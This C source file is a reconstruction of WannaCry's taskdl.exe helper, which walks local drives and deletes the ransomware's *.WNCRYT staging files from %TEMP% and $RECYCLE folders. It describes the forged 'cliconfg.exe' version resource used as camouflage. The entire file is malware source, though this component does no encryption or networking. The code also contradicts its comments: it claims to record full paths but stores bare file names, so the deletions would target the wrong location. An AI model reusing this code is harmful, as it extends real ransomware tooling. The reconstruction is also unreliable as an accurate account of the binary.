// taskdl.cpp — the WannaCry staging-cleaner (taskdl.exe)
// One-shot sweep of the local drives Z: down to C: deleting every *.WNCRYT
// file — the intermediate rename state the payload core leaves behind during
// an interrupted pass (original -> .WNCRYT -> encrypted .WNCRY). Cleanup
// only: no networking despite the historical "downloader" name, and the
// version resource is forged to "cliconfg.exe" (Microsoft SQL Client
// Configuration Utility) as camouflage.
// Reconstructed from the 2017 WannaCry binary (educational).

#include <windows.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

// ---------------------------------------------------------------------------
// Format strings and constants, mirroring the binary's .data section.
// ---------------------------------------------------------------------------
static const wchar_t FMT_DRIVE_RECYCLE[] = L"%C:\\%s";   // builds "X:\$RECYCLE"
static const wchar_t RECYCLE_DIR[]       = L"$RECYCLE";  // per-drive recycle folder
static const wchar_t FMT_DIR_FILE[]      = L"%s\\%s";    // builds "<dir>\<file>"
static const wchar_t FMT_DIR_PATTERN[]   = L"%s\\*%s";   // builds "<dir>*<ext>" search pattern
static const wchar_t STAGED_EXT[]        = L".WNCRYT";   // staging extension to sweep away
static const wchar_t ROOT_TEMPLATE[]     = L" :\\";      // drive-root template; the space is
                                                         // replaced by the drive letter

// The original calls the CRT's wide swprintf through its import table rather
// than a direct call; routing it through a function pointer mirrors that and
// keeps the non-standard %C format from tripping -Wformat warnings.
typedef int (__cdecl *SWPRINTF_FN)(wchar_t *, const wchar_t *, ...);
static SWPRINTF_FN swprintf_iat = (SWPRINTF_FN)swprintf;

static const size_t WSTR_NPOS = (size_t)-1;              // std::wstring::npos, old STL value

// ---------------------------------------------------------------------------
// Emulation of the VC6-era std::wstring / std::vector<wstring> shipped in
// MSVCP60.dll, so the reconstruction uses the same memory layout as the
// original binary.
//
// Data layout of a basic_string<wchar> object (0x10 bytes):
//   union { wchar_t buf[8]; wchar_t *ptr; }   // small-string buffer or heap pointer
//   size_t size;                              // characters in use
//   size_t capacity;                          // allocated characters
// A heap string carries a 2-byte prelude before its character data; the
// byte at ptr[-1] is a reference count that implements copy-on-write
// sharing. Counts of 0x00 or 0xFF mark a frozen/shared-static block, which
// is freed outright instead of being decremented.
// ---------------------------------------------------------------------------

typedef struct {                 // one string object, 0x10 bytes
    wchar_t *ptr;                // heap buffer (2-byte refcount prelude) or NULL if empty
    size_t   size;               // characters in use
    size_t   cap;                // allocated capacity
} VC6wstring;

typedef struct {                 // vector<wstring>: begin / end / end-of-storage
    VC6wstring *first;
    VC6wstring *last;
    VC6wstring *alloc;
} WStringVector;

#define WSTR_REFCOUNT(p) (*((unsigned char *)(p) - 1))   // refcount byte before the chars

static void *op_new(size_t n)          // operator new
{
    return malloc(n);
}

static void op_delete(void *p)         // operator delete
{
    free(p);
}

// Wide-character copy, plain forward loop, no overlap handling.
// (Named *_n to avoid clashing with the CRT's wmemcpy declaration.)
static void wmemcpy_n(wchar_t *dst, const wchar_t *src, size_t n)
{
    for (; n != 0; n--) {
        *dst++ = *src++;
    }
}

// Overlap-aware wide-character move: walks backward when the destination
// overlaps the source range, forward otherwise. Only the original's
// (unreachable) self-copy branch used it; kept for completeness.
// (Named *_n to avoid clashing with the CRT's own wmemmove declaration.)
#if defined(__GNUC__)
__attribute__((unused))
#endif
static void wmemmove_n(wchar_t *dst, const wchar_t *src, size_t n)
{
    if ((const wchar_t *)dst < src && src < dst + n) {
        wchar_t *d = dst + n;      // overlap: copy back-to-front
        const wchar_t *s = src + n;
        for (; n != 0; n--) {
            *--d = *--s;
        }
    } else {
        for (; n != 0; n--) {      // no overlap: plain forward copy
            *dst++ = *src++;
        }
    }
}

// Grow the string so it can hold n characters plus a terminator. This
// reconstruction always heap-allocates with a live refcount byte at ptr[-1]
// (never uses the inline small-string buffer) so the copy-on-write dtor and
// copy paths below stay honest.
static int wstring_grow(VC6wstring *s, size_t n)
{
    if (s->ptr != NULL && s->cap >= n + 1) {                       // already big enough
        return 1;
    }
    unsigned char *base;
    if (s->ptr != NULL) {
        base = (unsigned char *)realloc((char *)s->ptr - 2, 2 + (n + 1) * sizeof(wchar_t));
        if (base == NULL) return 0;
        s->ptr = (wchar_t *)(base + 2);
        WSTR_REFCOUNT(s->ptr) = 1;                                 // single owner after grow
    } else {
        base = (unsigned char *)op_new(2 + (n + 1) * sizeof(wchar_t));
        if (base == NULL) return 0;
        s->ptr = (wchar_t *)(base + 2);
        s->ptr[0] = L'\0';
        WSTR_REFCOUNT(s->ptr) = 1;
    }
    s->cap = n + 1;
    return 1;
}

// Destructor: release the heap buffer (free a frozen/unshared block outright,
// otherwise drop the refcount), blank the object, and optionally free the
// object itself (matches the original's stack-object variant).
static void wstring_dtor(VC6wstring *s, int freeSelf)
{
    if (s->ptr != NULL) {
        unsigned char rc = WSTR_REFCOUNT(s->ptr);
        if (rc == 0x00 || rc == 0xFF) {                            // frozen/shared-static
            op_delete((char *)s->ptr - 2);                         // free block base (prelude)
        } else {
            WSTR_REFCOUNT(s->ptr) = rc - 1;                        // one fewer owner
        }
    }
    s->ptr  = NULL;
    s->size = 0;
    s->cap  = 0;
    if (freeSelf & 1) {
        op_delete(s);
    }
}

// Copy constructor. Fast path: when the source is a heap string with a low
// refcount, share its buffer and bump the count (copy-on-write). Otherwise
// deep-copy through grow. Self-copy is unreachable in this program (insert
// always copies from a distinct temp) and simply returns.
static VC6wstring *wstring_copy_ctor(VC6wstring *dst, const VC6wstring *src)
{
    if (dst == NULL) return NULL;
    {
        unsigned char rc_src = src->ptr ? WSTR_REFCOUNT(src->ptr) : 0;
        size_t n = src->size;
        if (n > WSTR_NPOS) n = WSTR_NPOS;                          // npos clamp

        if (dst == src) {
            /* self-copy: unreachable in this program */
            return dst;
        }

        // copy-on-write fast path: share the source buffer, bump its refcount
        if (n != 0 && n == src->size && src->ptr != NULL && rc_src < 0xFE) {
            wstring_dtor(dst, 0);                                  // release dst's old buffer
            dst->ptr  = src->ptr;
            dst->size = src->size;
            dst->cap  = src->cap;
            WSTR_REFCOUNT(src->ptr) = rc_src + 1;                  // one more owner
            return dst;
        }

        // deep path: grow dst, copy the characters, terminate
        if (wstring_grow(dst, n)) {
            wchar_t *p = dst->ptr;
            wmemcpy_n(p, src->ptr, n);
            dst->size = n;
            p[n] = L'\0';
        }
    }
    return dst;
}

// Destroy every element (releasing or unsharing each string buffer), free
// the element array, and zero the vector.
static void vector_dealloc(WStringVector *v)
{
    VC6wstring *p = v->first;
    VC6wstring *end = v->last;
    for (; p != end; p++) {
        if (p->ptr != NULL) {
            unsigned char rc = WSTR_REFCOUNT(p->ptr);
            if (rc == 0x00 || rc == 0xFF) {                        // frozen/shared-static
                op_delete((char *)p->ptr - 2);                     // free block base (prelude)
            } else {
                WSTR_REFCOUNT(p->ptr) = rc - 1;                    // one fewer owner
            }
        }
        p->ptr = NULL; p->size = 0; p->cap = 0;
    }
    op_delete(v->first);
    v->first = NULL; v->last = NULL; v->alloc = NULL;
}

// Insert `count` copies of `val` before position `where`. When spare
// capacity is insufficient, allocate a fresh array using the STL growth
// heuristic (new capacity = current size + max(count, current size)) and
// copy the elements around the inserted run; otherwise fill in place at
// the end. The full STL routine also handles mid-vector moves; this
// program only ever appends.
static void vector_insert(WStringVector *v, VC6wstring *where, size_t count,
                          const VC6wstring *val)
{
    size_t free_cap = (size_t)(v->alloc - v->last);
    if (free_cap < count) {
        // --- out of capacity: reallocate ---
        size_t old_size = v->first ? (size_t)(v->last - v->first) : 0;
        size_t new_cap = count > old_size ? count : old_size;
        new_cap += old_size;
        if ((int)new_cap < 0) new_cap = 0;

        VC6wstring *nb = (VC6wstring *)op_new(new_cap * sizeof(VC6wstring));
        VC6wstring *w  = nb;
        VC6wstring *p;
        for (p = v->first; p != where; p++) wstring_copy_ctor(w++, p);   // copy head
        { size_t c = count; while (c--) wstring_copy_ctor(w++, val); }   // inserted run
        for (p = where; p != v->last; p++) wstring_copy_ctor(w++, p);    // copy tail

        for (p = v->first; p != v->last; p++) wstring_dtor(p, 0);  // destroy old elements
        op_delete(v->first);

        v->first = nb;
        v->last  = nb + old_size + count;
        v->alloc = nb + new_cap;
    } else {
        // --- room available: fill in place at the end ---
        VC6wstring *p = v->last;
        size_t c = count;
        while (c--) wstring_copy_ctor(p++, val);
        v->last = p;
    }
}

// ---------------------------------------------------------------------------
// BuildScanBasePath — choose where the *.WNCRYT sweep looks on one drive:
//   - the drive holding the Windows directory -> %TEMP% (the payload core's
//     working directory; trailing '\' stripped so paths join cleanly)
//   - any other drive                         -> its "X:\$RECYCLE" folder
// ---------------------------------------------------------------------------
static wchar_t *BuildScanBasePath(int driveIdx, wchar_t *out)
{
    GetWindowsDirectoryW(out, 0x104);                              // e.g. "C:\WINDOWS"
    if ((unsigned short)out[0] == (wchar_t)('A' + driveIdx)) {     // Windows drive = scanned drive?
        UINT n = GetTempPathW(0x104, out);                         // sweep %TEMP% instead
        if ((int)n > 0) {
            if (out[n - 1] == L'\\') {                             // strip trailing backslash
                out[n - 1] = L'\0';
            }
        }
    } else {
        swprintf_iat(out, FMT_DRIVE_RECYCLE,                       // "X:\$RECYCLE"
                     (wchar_t)('A' + driveIdx), RECYCLE_DIR);
    }
    return out;
}

// ---------------------------------------------------------------------------
// DeleteWnCrytFiles — one drive's sweep.
//
// Enumerates every file matching "<base>\*.WNCRYT". FindFirstFile/FindNext
// match files regardless of their attributes, so entries the payload core
// marked hidden or system are still collected. Each hit is recorded as a
// full path, the search handle is closed, then the collected paths are
// deleted one by one. Returns the count of successful deletions (WinMain
// discards it).
// ---------------------------------------------------------------------------
static int DeleteWnCrytFiles(int driveIdx)
{
    // The original wraps this in an SEH frame whose unwind destroys the
    // file vector if an allocation throws.
    wchar_t base[260];          // where this drive's sweep looks
    wchar_t pattern[260];       // search pattern, later reused as full-path buffer
    WIN32_FIND_DATAW wfd;       // current find result
    WStringVector files;        // collected paths to delete
    int deleted = 0;

    files.first = NULL; files.last = NULL; files.alloc = NULL;

    BuildScanBasePath(driveIdx, base);
    swprintf_iat(pattern, FMT_DIR_PATTERN, base, STAGED_EXT);      // "<base>*.WNCRYT"

    HANDLE hFind = FindFirstFileW(pattern, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) {
        vector_dealloc(&files);        // nothing matched on this drive
        return 0;
    }

    do {
        // turn the pattern buffer into the full path "<base>\<file name>"
        swprintf_iat(pattern, FMT_DIR_FILE, base, wfd.cFileName);

        // build a temp string from the file name and append it to the list
        VC6wstring tmp = {NULL, 0, 0};
        size_t len = wcslen(wfd.cFileName);
        if (wstring_grow(&tmp, len)) {
            wmemcpy_n(tmp.ptr, wfd.cFileName, len);
            tmp.ptr[len] = L'\0';
            tmp.size = len;
        }

        vector_insert(&files, files.last, 1, &tmp);
        wstring_dtor(&tmp, 0);                                     // temp no longer needed
    } while (FindNextFileW(hFind, &wfd));

    FindClose(hFind);

    // delete every collected path, counting successes. A blank entry
    // (empty string) simply fails to delete and is not counted.
    {
        VC6wstring *p = files.first;
        for (; p != files.last; p++) {
            if (DeleteFileW(p->ptr ? p->ptr : L"")) {
                deleted++;
            }
        }
    }

    vector_dealloc(&files);
    return deleted;
}

// ---------------------------------------------------------------------------
// WinMain — the whole program. One pass, no persistence, then exit.
//
// Walks the drive letters from Z: down to C:. For each drive that exists
// (GetLogicalDrives bitmask) and is not a network (remote) drive, it runs
// one *.WNCRYT sweep followed by a 10 ms Sleep — pacing so the sweep does
// not hammer every drive in a tight loop.
// ---------------------------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine,
                      int nCmdShow)
{
    (void)hInst; (void)hPrevInst; (void)lpCmdLine; (void)nCmdShow; // args ignored

    DWORD drives = GetLogicalDrives();                             // bit N set = drive 'A'+N present
    wchar_t root[4];
    memcpy(root, ROOT_TEMPLATE, sizeof(root));                     // seed " :\"; letter patched below

    for (int idx = 25; idx >= 2; idx--) {                          // drive letters 'Z' down to 'C'
        *(wchar_t *)root = (wchar_t)('A' + idx);                   // patch in the drive letter

        if (((drives >> idx) & 1) == 0) {
            continue;                                              // drive letter not present
        }
        if (GetDriveTypeW(root) == DRIVE_REMOTE) {
            continue;                                              // network drives are skipped entirely
        }
        DeleteWnCrytFiles(idx);
        Sleep(10);                                                 // brief pause between drives
    }
    return 0;
}

// ---------------------------------------------------------------------------
// CRT entry (standard MSVC GUI startup, summarized)
// ---------------------------------------------------------------------------
// Stock boilerplate around WinMain, nothing WannaCry-specific: sets the app
// type to GUI, initializes the CRT (FP control word, math-error handler,
// static initializers), parses the raw command line past the quoted program
// name, takes the show-window state from GetStartupInfo, calls WinMain, and
// exits with its return value (or _exits with the saved code on an
// unhandled exception).
